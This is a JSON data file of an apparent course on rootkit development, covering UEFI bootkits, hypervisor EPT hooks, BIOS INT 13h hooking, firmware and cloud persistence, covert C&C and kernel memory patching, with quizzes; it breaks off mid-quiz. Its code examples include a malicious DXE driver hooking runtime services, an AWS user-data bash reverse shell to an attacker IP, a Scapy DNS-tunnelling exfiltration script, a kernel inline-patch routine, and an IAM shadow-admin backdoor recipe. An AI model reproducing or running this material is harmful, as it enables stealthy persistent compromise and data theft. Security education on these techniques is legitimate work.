                "title": "UEFI Bootkit Development",
                "duration": "120 min",
                "objectives": [
                    "Understand the architecture of a UEFI bootkit.",
                    "Exploit the DXE (Driver Execution Environment) phase for code execution.",
                    "Hook UEFI runtime services to survive into the OS.",
                    "Investigate SMM (System Management Mode) as a target for exploitation.",
                    "Use UEFI variable manipulation for persistence."
                ],
                "content": {
                    "overview": "This lesson moves from the legacy MBR to the modern world of UEFI, exploring the advanced techniques required to develop a UEFI bootkit. We will learn how to write a malicious UEFI driver, how to get it loaded during the boot process, and how to hook critical UEFI services to infect the operating system as it loads.",
                    "sections": [
                        {
                            "title": "UEFI Bootkit Architecture",
                            "content": "<p>A UEFI bootkit is a piece of malware that infects the UEFI pre-boot environment. Unlike an MBR bootkit, which is a tiny piece of 16-bit code, a UEFI bootkit can be a full-featured, 64-bit program.</p><h3>The Typical Form:</h3><p>A UEFI bootkit is usually implemented as a malicious **DXE Driver**. The DXE (Driver Execution Environment) is the main phase of the UEFI boot process where drivers for hardware and system services are loaded from the EFI System Partition (ESP) on the hard drive. By planting a malicious driver on the ESP, an attacker can gain code execution during every boot.</p>",
                            "image": "https://images.unsplash.com/photo-1593435713588-a73de23947db?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "UEFI Runtime Service Hooking",
                            "content": "<p>Once the bootkit's malicious driver is running, its goal is to infect the operating system. A key way to do this is to hook the UEFI Runtime Services.</p><p>These are a set of services (like `GetVariable`, `SetVariable`, `ResetSystem`) that the UEFI firmware provides *to the running operating system*. The OS kernel will call these services even after the boot process is over. By hooking one of these service pointers in memory, the bootkit can ensure that its code will be executed again later by the OS kernel itself. This allows it to 'survive' the transition from the pre-boot environment into the running OS.</p>",
                            "image": "https://images.unsplash.com/photo-1587620962725-abab7fe55159?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "SMM (System Management Mode) Exploitation",
                            "content": "<p>SMM is the most privileged execution mode of an x86 CPU—even more privileged than the OS kernel in Ring 0. It is designed for low-level system management tasks. A vulnerability that allows an attacker to get code execution in SMM is critical, as it gives them a place to run that is completely invisible to the operating system and any security software running on it.</p><p><strong>Real-world Example: UEFI Variable Persistence.</strong> An attacker has a bootkit running. They want to store a configuration file or the next stage of their malware, but they don't want to store it on the main file system where it might be found. Instead, they can use the UEFI `SetVariable` runtime service to create a new, custom UEFI variable. This variable is stored in a special, non-volatile RAM (NVRAM) chip on the motherboard. The data will persist even if the entire hard drive is wiped and the OS is reinstalled. This is an extremely powerful persistence technique.</p>",
                            "image": "https://images.unsplash.com/photo-1548092372-2d987bde898b?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "UEFI DXE Driver Development (Conceptual)",
                            "language": "c",
                            "code": "// This is a conceptual C code snippet from the entry point of a malicious DXE driver.\n\n#include <Uefi.h>\n#include <Library/UefiBootServicesTableLib.h>\n\nEFI_STATUS\nEFIAPI\nMaliciousDriverEntryPoint (\n  IN EFI_HANDLE        ImageHandle,\n  IN EFI_SYSTEM_TABLE  *SystemTable\n  )\n{\n  // The driver is now running in the DXE phase, before the OS has been loaded.\n\n  // 1. Find the address of the UEFI System Table.\n  EFI_SYSTEM_TABLE *pSystemTable = SystemTable;\n\n  // 2. Find the address of the UEFI Runtime Services table within the System Table.\n  EFI_RUNTIME_SERVICES *pRuntimeServices = pSystemTable->RuntimeServices;\n\n  // 3. Hook a function in the runtime services table.\n  //    For example, save the original address of the GetVariable function.\n  OriginalGetVariable = pRuntimeServices->GetVariable;\n  //    Then, overwrite the pointer with the address of our malicious hook function.\n  pRuntimeServices->GetVariable = HookedGetVariable;\n\n  // 4. The hook is now in place. When the OS later calls GetVariable,\n  //    our malicious code will run first.\n\n  return EFI_SUCCESS;\n}"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "A UEFI bootkit is typically implemented as what?",
                            "options": [
                                "A user-mode application.",
                                "A malicious UEFI driver that is loaded during the DXE (Driver Execution Environment) phase.",
                                "A bash script.",
                                "A registry key."
                            ],
                            "correct": 1,
                            "explanation": "The DXE phase is where the UEFI firmware loads drivers for all the hardware. An attacker can create their own malicious driver and use various techniques to get it loaded during this phase, giving them control of the system before the OS even starts."
                        },
                        {
                            "id": 2,
                            "question": "What is the most privileged execution mode on an x86 CPU, even more privileged than the Ring 0 kernel?",
                            "options": [
                                "User Mode (Ring 3)",
                                "Real Mode",
                                "System Management Mode (SMM)",
                                "Protected Mode"
                            ],
                            "correct": 2,
                            "explanation": "SMM is a highly privileged mode that is designed for system management and is intended to be transparent to the operating system. A rootkit that can run in SMM is effectively invisible to any software running on the main CPU."
                        },
                        {
                            "id": 3,
                            "question": "A bootkit that stores its data in a special, non-volatile RAM chip on the motherboard, allowing it to survive a full OS reinstall, is using what for persistence?",
                            "options": [
                                "The Master Boot Record (MBR).",
                                "The file system.",
                                "UEFI Variables.",
                                "The system registry."
                            ],
                            "correct": 2,
                            "explanation": "UEFI variables provide a persistent storage mechanism that is independent of the main hard drive. This makes them a very powerful and stealthy place for a bootkit to store its configuration or payloads."
                        }
                    ]
                }
            },
            {
                "id": "lesson-12",
                "title": "Hypervisor-Based Rootkits (HVCI)",
                "duration": "100 min",
                "objectives": [
                    "Understand the architecture of a Type-1 (bare-metal) hypervisor.",
                    "Analyze the Virtual Machine Control Structure (VMCS).",
                    "Exploit Extended Page Tables (EPT) to hook and modify guest memory.",
                    "Discuss the challenges of bypassing Hypervisor-Protected Code Integrity (HVCI).",
                    "Differentiate between exploiting a Type-1 vs a Type-2 hypervisor."
                ],
                "content": {
                    "overview": "A hypervisor, or Virtual Machine Monitor (VMM), is the software that creates and runs virtual machines. A hypervisor-based rootkit is the ultimate in stealth and control. By compromising the hypervisor, an attacker can gain complete control over all the guest operating systems running on top of it, in a way that is completely transparent to those guest OSes.",
                    "sections": [
                        {
                            "title": "Hypervisor Architecture",
                            "content": "<p>CPUs have special hardware features (Intel VT-x and AMD-V) to support virtualization. These create a new execution mode that is even more privileged than Ring 0, sometimes called 'Ring -1'.</p><ul><li><strong>Type-1 (Bare-metal) Hypervisor:</strong> Runs directly on the host's hardware (e.g., VMware ESXi, Microsoft Hyper-V).</li><li><strong>Type-2 Hypervisor:</strong> Runs as an application on top of a host operating system (e.g., VirtualBox, VMware Workstation).</li></ul><p>A hypervisor-based rootkit is essentially a malicious hypervisor. It takes control of the hardware virtualization features and places the entire, original operating system inside a virtual machine that the rootkit now controls.</p>",
                            "image": "https://images.unsplash.com/photo-1593435713588-a73de23947db?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "EPT Manipulation",
                            "content": "<p>Extended Page Tables (EPT), also known as Nested Paging, is the hardware feature that allows a hypervisor to manage the memory of its guest VMs.</p><p>A hypervisor-based rootkit can manipulate the EPT to create a hook that is completely invisible to the guest OS. For example, to hook a function, the rootkit can find the physical memory page containing that function's code. It can then modify the EPT to mark that specific page as 'not present'. When the guest OS tries to execute that code, it will trigger a special type of page fault called an 'EPT violation', which traps execution back to the hypervisor. The hypervisor (the rootkit) can then perform its malicious action and then fix up the EPT to allow the legitimate code to run. To the guest OS, nothing appears to have been modified.</p>",
                            "image": "https://images.unsplash.com/photo-1587620962725-abab7fe55159?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Bypassing Hypervisor-Protected Code Integrity (HVCI)",
                            "content": "<p>HVCI, also known as Memory Integrity, is a security feature in modern Windows that uses the hypervisor to protect the kernel of the main OS. It runs the main OS in a less-privileged virtualized state, while a small, secure part of Windows runs in the hypervisor at a higher privilege level.</p><p>The hypervisor's job is to use EPT to ensure that kernel memory can never be both writable and executable at the same time. This is designed to prevent kernel-mode rootkits from patching kernel code or hooking tables like the SSDT. Bypassing HVCI is an extremely advanced area of research that requires finding a vulnerability in the hypervisor's own implementation or in the underlying CPU hardware.</p>",
                            "image": "https://images.unsplash.com/photo-1548092372-2d987bde898b?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "EPT Hook Installation (Conceptual)",
                            "language": "c",
                            "code": "// This is highly conceptual C-like pseudocode for the logic of an EPT hook.\n\n// 1. The hypervisor rootkit is running in VMX root mode (Ring -1).\n//    The target OS is running in VMX non-root mode (Ring 0).\n\n// 2. Find the physical address of the target page in the guest OS memory that we want to hook.\nPHYSICAL_ADDRESS target_page = GetPhysicalAddressOfGuestFunction(guest_cr3, virtual_address_of_function);\n\n// 3. Find the EPT entry that corresponds to this physical page.\nEPT_ENTRY* p_ept_entry = WalkEPT(target_page);\n\n// 4. Modify the EPT entry to remove the 'execute' permission.\np_ept_entry->execute_access = 0;\n\n// 5. When the guest OS tries to execute code on this page, it will cause an EPT violation VM-Exit.\n//    Execution will trap from the guest OS back to our hypervisor rootkit.\n\n// --- Inside the VM-Exit Handler ---\nvoid HandleEPTViolation(...) {\n    // a. We have now gained control.\n    // b. Perform our malicious action.\n    // c. Temporarily set the 'execute' permission back to 1 in the EPT entry.\n    // d. Resume the guest VM. The instruction will now succeed.\n    // e. In a single-step handler, immediately set the permission back to 0 to re-arm the hook.\n}"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "A hypervisor-based rootkit operates at which privilege level?",
                            "options": [
                                "User Mode (Ring 3)",
                                "Kernel Mode (Ring 0)",
                                "A level more privileged than the kernel, often called 'Ring -1'.",
                                "It does not have a privilege level."
                            ],
                            "correct": 2,
                            "explanation": "Hypervisors leverage hardware virtualization extensions (like Intel VT-x) to create a new execution mode that is even more powerful than the traditional Ring 0, allowing them to control the entire guest operating system."
                        },
                        {
                            "id": 2,
                            "question": "The CPU hardware feature that allows a hypervisor to manage a guest VM's memory by translating guest physical addresses to host physical addresses is known as:",
                            "options": [
                                "The SSDT",
                                "The GDT",
                                "Extended Page Tables (EPT) or Nested Paging",
                                "The MBR"
                            ],
                            "correct": 2,
                            "explanation": "EPT is the fundamental hardware technology that makes memory virtualization efficient. A hypervisor rootkit can manipulate the EPT to control the guest's view of its own memory, which is a powerful technique for stealthy hooking."
                        },
                        {
                            "id": 3,
                            "question": "The Windows security feature that uses virtualization to protect the main OS kernel from modification is known as:",
                            "options": [
                                "BitLocker",
                                "Secure Boot",
                                "Hypervisor-Protected Code Integrity (HVCI) / Memory Integrity",
                                "User Account Control (UAC)"
                            ],
                            "correct": 2,
                            "explanation": "HVCI is a key part of Virtualization-Based Security (VBS). It uses the hypervisor as a trusted third party to enforce that kernel memory is never both writable and executable, which is a powerful defense against many common rootkit techniques."
                        }
                    ]
                }
            },
            
        {
            "id": "lesson-13",
            "title": "BIOS and Legacy Bootkit Techniques",
            "duration": "90 min",
            "objectives": [
                "Understand the limitations and architecture of the legacy BIOS.",
                "Implement a hook on a BIOS interrupt handler (e.g., INT 13h).",
                "Analyze and exploit Option ROMs for persistence.",
                "Develop a BIOS-level rootkit.",
                "Manipulate the legacy boot process to inject code into the OS loader."
            ],
            "content": {
                "overview": "Before UEFI, the BIOS was the master of the pre-boot environment. While largely replaced, legacy BIOS systems still exist, and understanding how to exploit them provides crucial context for modern firmware attacks. This lesson covers the techniques for infecting the legacy BIOS, hooking its interrupts, and using it as a powerful persistence mechanism.",
                "sections": [
                    {
                        "title": "BIOS Architecture and Limitations",
                        "content": "<p>The Basic Input/Output System (BIOS) is a piece of firmware stored on a chip on the motherboard. Its job is to perform the Power-On Self-Test (POST) and then find and execute the boot code from the Master Boot Record (MBR).</p><h3>Key Limitations:</h3><ul><li><strong>16-bit Real Mode:</strong> The BIOS operates in the archaic 16-bit real mode of the CPU.</li><li><strong>No Security:</strong> The legacy BIOS has no concept of secure boot or signature verification. It will blindly execute any code it is told to.</li><li><strong>Updatability:</strong> The BIOS firmware can be 'flashed' or updated. This is the primary vector for a BIOS-level rootkit.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1593435713588-a73de23947db?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "INT 13h Hooking",
                            "content": "<p>The BIOS provides a set of services to the bootloader via software interrupts. The most famous is `INT 13h`, the interrupt used for reading and writing to the disk.</p><p>A BIOS rootkit can hook this interrupt. It works by modifying the Interrupt Vector Table (IVT) in memory to point to its own malicious handler. When the OS bootloader (like `NTLDR` on Windows XP) uses `INT 13h` to read the kernel from the disk into memory, the rootkit's code runs first. This allows the rootkit to modify the kernel on-the-fly as it is being loaded, infecting the OS before it even starts.</p>",
                            "image": "https://images.unsplash.com/photo-1587620962725-abab7fe55159?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Option ROM Exploitation",
                            "content": "<p>Expansion cards (like network cards or RAID controllers) have their own firmware stored in an 'Option ROM'. The BIOS will execute the code from these Option ROMs during the POST process.</p><p><strong>Real-world Example: The Rakshasa Rootkit.</strong> Rakshasa was a proof-of-concept open-source BIOS rootkit that infected the Option ROM of the network interface card (NIC). By compromising the NIC's firmware, it could achieve persistence that was independent of the hard drive and the main BIOS. Even if the victim wiped their hard drive or re-flashed their motherboard BIOS, the rootkit on the network card would survive and could re-infect the system. This demonstrates the extreme persistence that firmware-level malware can achieve.</p>",
                            "image": "https://images.unsplash.com/photo-1548092372-2d987bde898b?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "BIOS Interrupt Hooking (Conceptual Assembly)",
                            "language": "c",
                            "code": "// This is conceptual 16-bit assembly for a BIOS rootkit hooking INT 13h.\n\n// 1. Get the original address of the INT 13h handler from the Interrupt Vector Table.\nmov ax, 0\nmov es, ax\nmov bx, [es:0x13*4] ; Get the segment\nmov original_int13_offset, bx\nmov bx, [es:0x13*4+2] ; Get the offset\nmov original_int13_segment, bx\n\n// 2. Overwrite the entry in the IVT with the address of our hook function.\ncli ; Disable interrupts\nmov [es:0x13*4], hooked_int13\nmov [es:0x13*4+2], cs\nsti ; Re-enable interrupts\n\n// --- Our Hook Handler ---\nhooked_int13:\n    ; Check if this is a disk read operation for a specific sector (e.g., the OS kernel).\n    cmp ah, 0x02 ; AH=2 is the 'Read Sectors' function\n    jne pass_through\n\n    ; If it is, perform our malicious action (e.g., patch the kernel in the buffer).\n    call patch_kernel_in_memory\n\npass_through:\n    ; Finally, jump to the original INT 13h handler to let the normal operation complete.\n    jmp original_int13_segment:original_int13_offset"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "What is the primary vulnerability of the legacy BIOS that bootkits exploit?",
                            "options": [
                                "It runs too fast.",
                                "It is written in C++.",
                                "It has no mechanism for verifying the cryptographic signature of the code it loads (no Secure Boot).",
                                "It is stored on the hard drive."
                            ],
                            "correct": 2,
                            "explanation": "The lack of any integrity verification is the fundamental weakness of the legacy BIOS. It will blindly trust and execute whatever code it finds in the MBR, making it easy for a bootkit to take control."
                        },
                        {
                            "id": 2,
                            "question": "A BIOS rootkit that wants to modify the operating system kernel as it is being loaded from disk into memory would most likely hook which software interrupt?",
                            "options": [
                                "The keyboard interrupt (INT 16h)",
                                "The video interrupt (INT 10h)",
                                "The disk services interrupt (INT 13h)",
                                "The timer interrupt (INT 08h)"
                            ],
                            "correct": 2,
                            "explanation": "INT 13h is the BIOS service for all disk I/O. By hooking it, the rootkit can intercept every disk read, allowing it to find and patch the OS kernel on-the-fly before it is executed."
                        },
                        {
                            "id": 3,
                            "question": "Firmware on an expansion card, such as a network card, which is executed by the BIOS during the boot process, is known as an:",
                            "options": [
                                "MBR",
                                "Option ROM",
                                "LKM",
                                "UEFI Driver"
                            ],
                            "correct": 1,
                            "explanation": "Option ROMs are a powerful persistence vector. A rootkit that infects the firmware of a peripheral device can survive even a complete hard drive wipe and motherboard BIOS re-flash."
                        }
                    ]
                }
            },
            {
                "id": "lesson-14",
                "title": "Advanced Persistence Mechanisms",
                "duration": "100 min",
                "objectives": [
                    "Achieve persistence by modifying device firmware.",
                    "Simulate the functionality of a hardware implant.",
                    "Exploit the network boot process (PXE) for persistence.",
                    "Understand how to establish persistence in a cloud environment.",
                    "Develop strategies that use multiple, redundant persistence vectors."
                ],
                "content": {
                    "overview": "This lesson explores the cutting edge of persistence, moving beyond the operating system to the firmware of hardware devices and the fabric of the cloud. We will learn how attackers can achieve an 'un-reinstallable' foothold on a system by compromising the very code that runs on its peripheral components.",
                "sections": [
                    {
                        "title": "Firmware-Level Persistence",
                        "content": "<p>Many components in a computer have their own updatable firmware, and each is a potential target for a persistent implant.</p><h3>Targets for Firmware Rootkits:</h3><ul><li><strong>Network Interface Card (NIC):</strong> A rootkit on the NIC could intercept or modify network traffic before the main OS ever sees it.</li><li><strong>Hard Drive Firmware:</strong> A famous example is the 'Equation Group' (an APT) firmware implant, which could survive a secure wipe of the drive and would reinfect the MBR every time the computer booted.</li><li><strong>GPU Firmware:</strong> The Graphics Processing Unit has its own powerful processor and memory, which could be used to host a stealthy rootkit.</li></ul><p>These techniques require highly specialized reverse engineering skills for the specific hardware target.</p>",
                            "image": "https://images.unsplash.com/photo-1593435713588-a73de23947db?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Hardware Implant Simulation",
                            "content": "<p>A true hardware implant is a malicious modification to a device's circuit board. A classic example is a hardware keylogger placed on a keyboard cable.</p><p>While building physical implants is beyond the scope of this course, we can simulate their functionality. For example, a device like a 'USB Armory' is a full computer in a tiny USB stick form factor. It can be programmed to emulate multiple devices at once (like a keyboard, a mass storage device, and a network card). An attacker could plug this between a user's keyboard and their computer to perform a sophisticated man-in-the-middle attack to capture keystrokes and inject commands.</p>",
                            "image": "https://images.unsplash.com/photo-1575235028124-ab6346a5a0a3?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Cloud Infrastructure Persistence",
                            "content": "<p>Persistence in the cloud is not about infecting a single machine, but about establishing a persistent foothold in the cloud account itself.</p><p><strong>Real-world Example: Shadow Admins.</strong> An attacker compromises an AWS account. They want to maintain access even if the original compromised user changes their password. The attacker creates a new IAM user with a benign-sounding name like 'CloudWatchMonitor'. They then attach a policy to a *different* user or group that gives the 'CloudWatchMonitor' user the permission to set the permissions for *other* users. This is their backdoor. If they get kicked out, they can use their 'CloudWatchMonitor' user to re-grant themselves administrator privileges. This type of persistence is a misconfiguration in the IAM policy graph and is very difficult for defenders to spot.</p>",
                            "image": "https://images.unsplash.com/photo-1588196749597-9ff075ee6b5b?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Cloud Instance Persistence (AWS User Data)",
                            "language": "bash",
                            "code": "# This script demonstrates a simple but effective cloud persistence mechanism in AWS.\n# 'User data' is a script that is automatically run with root privileges the first\n# time an EC2 instance is booted.\n\n# An attacker with privileges to launch a new EC2 instance can use this to get a shell.\n\naws ec2 run-instances \\\n    --image-id ami-0123456789abcdef0 \\\n    --instance-type t2.micro \\\n    --key-name my-key-pair \\\n    # The user data script is passed as an argument.\n    # This script will launch a reverse shell back to the attacker's IP every time\n    # this new instance is booted.\n    --user-data \"#!/bin/bash\nbash -i >& /dev/tcp/198.51.100.55/4444 0>&1\""
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "A rootkit that infects the firmware of a hard drive or a network card is particularly dangerous because:",
                            "options": [
                                "It can make the device run faster.",
                                "It is easy to detect with antivirus.",
                                "It can survive a complete wipe and reinstall of the operating system.",
                                "It can only be written in Python."
                            ],
                            "correct": 2,
                            "explanation": "Firmware-level persistence is extremely powerful because the malware resides on a component separate from the main OS storage. This allows it to persist even if the entire hard drive is replaced."
                        },
                        {
                            "id": 2,
                            "question": "What is the primary goal of a hardware keylogger?",
                            "options": [
                                "To speed up typing.",
                                "To passively intercept and record every keystroke a user makes.",
                                "To inject malicious keystrokes.",
                                "To encrypt the keyboard."
                            ],
                            "correct": 1,
                            "explanation": "A hardware keylogger is a covert surveillance device. It sits between the keyboard and the computer, capturing all the raw data before it even reaches the operating system, making it invisible to any software."
                        },
                        {
                            "id": 3,
                            "question": "In a cloud environment, what is the most effective way for an attacker to achieve long-term persistence?",
                            "options": [
                                "By installing a rootkit on a single virtual machine.",
                                "By creating a 'shadow admin' account or manipulating IAM policies to create a hidden administrative backdoor.",
                                "By stealing the password of one user.",
                                "By launching a DDoS attack."
                            ],
                            "correct": 1,
                            "explanation": "Persistence in the cloud is about controlling the control plane. A single infected VM can be easily found and terminated. A subtle, malicious IAM policy can provide an attacker with persistent, god-like access to the entire account in a way that is very difficult to detect."
                        }
                    ]
                }
            },
            {
                "id": "lesson-15",
                "title": "Rootkit Communication and C&C",
                "duration": "100 min",
                "objectives": [
                    "Design and implement covert communication channels.",
                    "Use network protocol steganography to hide data.",
                    "Develop a C&C channel using DNS tunneling.",
                    "Create a simple ICMP-based covert channel.",
                    "Reverse engineer and decrypt custom C&C protocols."
                ],
                "content": {
                    "overview": "A rootkit must be able to receive commands and exfiltrate data without being detected by network security tools. This lesson focuses on the development of covert communication channels, exploring how to hide C&C traffic in plain sight by tunneling it within legitimate protocols or using steganography to conceal its very existence.",
                    "sections": [
                        {
                            "title": "Covert Communication Channels",
                            "content": "<p>A covert channel is a communication method that uses a protocol in a way it was not intended to be used, in order to bypass security controls.</p><h3>The Goal:</h3><p>The goal is to make the malicious C&C traffic look like normal, benign network traffic that a firewall would be configured to allow.</p>",
                            "image": "https://images.unsplash.com/photo-1548092372-2d987bde898b?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "DNS and ICMP Tunneling",
                            "content": "<h3>DNS Tunneling:</h3><p>This is a very common and effective technique. The rootkit encodes its outbound data (e.g., a command result) as a long subdomain and makes a DNS query for it (e.g., `[encoded_data].c2.com`). The attacker's malicious DNS server receives the query and decodes the data. To send a command *to* the rootkit, the attacker can encode the command in the response to a DNS query, often in a TXT record.</p><h3>ICMP Tunneling:</h3><p>This technique hides data in the payload of ICMP (Ping) echo request/reply packets. Since most networks allow Ping traffic for diagnostic purposes, this can be a stealthy way to bypass a restrictive firewall.</p>",
                            "image": "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Network Protocol Steganography",
                            "content": "<p>This is an even stealthier technique where the data is hidden in unused or optional fields of legitimate protocol headers.</p><p><strong>Real-world Example: Hiding data in TCP headers.</strong> The TCP header has several fields, like the 'Initial Sequence Number' (ISN) or the 'Timestamp' option, that are often predictable or can be manipulated without breaking the connection. A rootkit could establish a legitimate-looking HTTP connection to a web server. However, it could encode its C&C data, a few bytes at a time, in the sequence numbers of the TCP packets. To an IDS, it just looks like a normal web session, but the attacker's server can reassemble the sequence numbers to decode the hidden message.</p>",
                            "image": "https://images.unsplash.com/photo-1504384308090-c894fdcc538d?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "DNS Tunneling Implementation (Scapy)",
                            "language": "python",
                            "code": "from scapy.all import *\n\n# This conceptual Scapy script demonstrates sending a covert message via DNS query.\n\nc2_domain = \"c2.com\"\ndata_to_exfiltrate = \"secret_data\"\n\n# 1. Encode the data (e.g., in hex)\nencoded_data = data_to_exfiltrate.encode().hex()\n\n# 2. Construct the malicious subdomain\nfull_domain = f\"{encoded_data}.{c2_domain}\"\n\n# 3. Create the DNS query packet\n#    The 'qname' is the query name, where we hide our data.\ndns_packet = IP(dst=\"8.8.8.8\") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=full_domain))\n\n# 4. Send the packet\n# The recursive DNS server (8.8.8.8) will forward the query to the attacker's\n# authoritative DNS server for 'c2.com', which will log the query and extract the data.\nsend(dns_packet)"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "The technique of hiding C&C data by encoding it into the subdomains of DNS queries is known as:",
                            "options": [
                                "ICMP Tunneling",
                                "DNS Tunneling",
                                "Steganography",
                                "A DDoS attack"
                            ],
                            "correct": 1,
                            "explanation": "DNS tunneling is a classic covert channel. It abuses the DNS protocol, which is almost always allowed through a firewall, to exfiltrate data or receive commands."
                        },
                        {
                            "id": 2,
                            "question": "What is the primary goal of using a covert channel for C&C?",
                            "options": [
                                "To make the connection faster.",
                                "To make the C&C traffic blend in with normal, legitimate network traffic to evade detection by firewalls and intrusion detection systems.",
                                "To use as little bandwidth as possible.",
                                "To crash the network."
                            ],
                            "correct": 1,
                            "explanation": "The entire purpose of a covert channel is stealth. By hiding its communication inside a protocol that is expected and allowed on the network, the rootkit's traffic becomes much harder to spot."
                        },
                        {
                            "id": 3,
                            "question": "The art of hiding data in unused or manipulated fields of legitimate protocol headers, like the TCP sequence number, is known as:",
                            "options": [
                                "Encryption",
                                "Compression",
                                "Network protocol steganography",
                                "A side-channel attack"
                            ],
                            "correct": 2,
                            "explanation": "Steganography is the art of hiding data in plain sight. In the network context, this involves modifying legitimate protocol traffic in subtle ways to carry a hidden message, making it extremely difficult to detect."
                        }
                    ]
                }
            },
            {
                "id": "lesson-16",
                "title": "Memory Manipulation and Injection",
                "duration": "100 min",
                "objectives": [
                    "Use Direct Memory Access (DMA) to read and write kernel memory.",
                    "Manipulate memory mappings to bypass security controls.",
                    "Perform cross-process memory injection.",
                    "Patch kernel code directly in memory.",
                    "Bypass memory protections like VBS/HVCI."
                ],
                "content": {
                    "overview": "This lesson covers the advanced art of direct memory manipulation. We will explore techniques that allow a rootkit to read and write to any part of physical memory, including the memory of the kernel and other processes. This provides the ultimate level of control and is the foundation for many sophisticated stealth and injection techniques.",
                    "sections": [
                        {
                            "title": "Direct Memory Access (DMA) Techniques",
                            "content": "<p>DMA is a feature of modern computers that allows peripheral devices (like a network card or a graphics card) to access main memory directly, without involving the CPU. This is done for performance. However, if an attacker can gain control of a DMA-capable device, they can use it to read and write to any part of physical memory, completely bypassing all of the CPU's and the OS's security protections.</p><p>This is the principle behind 'DMA attacks', often carried out over a Thunderbolt or FireWire port using a specialized hardware device like PCILeech.</p>",
                            "image": "https://images.unsplash.com/photo-1575235028124-ab6346a5a0a3?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Kernel Memory Patching",
                            "content": "<p>With the ability to write to kernel memory, a rootkit can perform the most direct and powerful form of hooking: directly patching kernel code.</p><p><strong>Real-world Example: Bypassing PatchGuard.</strong> Windows Kernel Patch Protection (PatchGuard) is a security feature that periodically checks if critical kernel structures, like the SSDT, have been modified. If it detects a hook, it will cause a Blue Screen of Death. To defeat this, a sophisticated rootkit will not hook the SSDT. Instead, it might find the code for a function like `NtCreateFile` in kernel memory and directly overwrite some of its assembly instructions with its own code. This is much harder for PatchGuard to detect. This requires disabling the write protection on the kernel's code pages first, which is a powerful technique in itself.</p>",
                            "image": "https://images.unsplash.com/photo-1587620962725-abab7fe55159?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Cross-Process Memory Injection",
                            "content": "<p>A kernel-mode rootkit, because it has access to all of physical memory, can easily inject code into any user-mode process. It can find the `EPROCESS` block of the target process, look up its page table directory, and then directly map and write its malicious code into the target's virtual address space. This is a much stealthier way to perform code injection than using the standard user-mode APIs like `CreateRemoteThread`, which are heavily monitored by EDR.</p>",
                            "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Kernel Memory Patching (Conceptual)",
                            "language": "c",
                            "code": "// This is conceptual C++ code for a Windows kernel driver that disables\n// write protection on a memory page and patches it.\n\n// 1. Get the address of the function we want to patch in the kernel.\nVOID* targetAddress = GetKernelFunctionAddress(\"NtCreateFile\");\n\n// 2. Get the Memory Descriptor List (MDL) for that memory page.\n//    This is the structure the kernel uses to manage physical memory.\nPMDL pMdl = IoAllocateMdl(targetAddress, 5, FALSE, FALSE, NULL);\nMmProbeAndLockPages(pMdl, KernelMode, IoReadAccess);\n\n// 3. Get a writable mapping of the (normally read-only) memory page.\nVOID* writableMapping = MmMapLockedPagesSpecifyCache(pMdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);\n\n// 4. Now we can write to the protected kernel code.\n//    Construct our 5-byte JMP patch.\nBYTE patch[5] = { 0xE9, 0x00, 0x00, 0x00, 0x00 };\n//    Calculate the relative offset and fill it in.\n*(DWORD*)&patch[1] = (DWORD)MyHookFunction - (DWORD)targetAddress - 5;\n\n//    Write the patch.\nRtlCopyMemory(writableMapping, patch, 5);\n\n// 5. Clean up.\nMmUnmapLockedPages(writableMapping, pMdl);\nMmUnlockPages(pMdl);\nIoFreeMdl(pMdl);"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "An attack that uses a malicious device connected via a Thunderbolt port to read the entire contents of physical RAM is known as a:",
                            "options": [
                                "Buffer overflow",
                                "DMA (Direct Memory Access) attack",
                                "Cold boot attack",
                                "SQL injection"
                            ],
                            "correct": 1,
                            "explanation": "DMA attacks abuse the fact that high-speed peripheral devices have direct access to memory, completely bypassing all OS-level security protections. They are a powerful physical access attack."
                        },
                        {
                            "id": 2,
                            "question": "What is the primary motivation for a rootkit to patch kernel code directly in memory (e.g., an inline hook) instead of hooking a table like the SSDT?",
                            "options": [
                                "It is easier to do.",
                                "To bypass modern kernel security protections like Kernel Patch Protection (PatchGuard), which are designed to protect known tables but not all of kernel code.",
                                "It makes the rootkit run faster.",
                                "It uses less memory."
                            ],
                            "correct": 1,
                            "explanation": "Directly patching kernel code is a much stealthier technique. It modifies a less obvious location, making it harder for security software that is focused on protecting well-known structures like the SSDT to detect."
                        },
                        {
                            "id": 3,
                            "question": "A kernel-mode rootkit can inject code into any user-mode process because:",
                            "options": [
                                "It asks the process for permission.",
                                "It has access to all of physical memory and can directly manipulate the page tables of the target process.",
                                "It uses a standard Windows API call.",
                                "It cannot inject code into other processes."
                            ],
                            "correct": 1,
